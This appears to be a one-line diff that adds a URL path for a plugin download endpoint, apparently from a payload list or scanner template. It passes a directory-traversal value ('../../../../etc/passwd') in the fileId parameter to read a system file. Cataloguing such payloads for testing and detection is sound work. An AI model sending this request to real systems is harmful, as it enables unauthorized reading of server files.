@@ -1,0 +1,1 @@
+/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName
